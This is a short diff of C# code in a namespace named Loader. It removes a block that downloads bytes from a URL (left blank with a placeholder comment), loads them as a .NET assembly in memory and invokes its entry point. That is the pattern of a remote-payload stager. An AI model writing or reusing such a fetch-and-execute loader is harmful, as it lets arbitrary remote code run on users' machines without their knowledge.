@@ -31,19 +31,6 @@ namespace Loader
                 }
                 Environment.Exit(0);   
             }
-
-            byte[] bin = new WebClient().DownloadData(""); // Insert your crappy URL here
-            Assembly a = Assembly.Load(bin);
-            MethodInfo method = a.EntryPoint;
-            object o = a.CreateInstance(method.Name);
-            try
-            {
-                method.Invoke(o, new object[] { });
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine(ex.Message);
-            }
         }
     }
 }
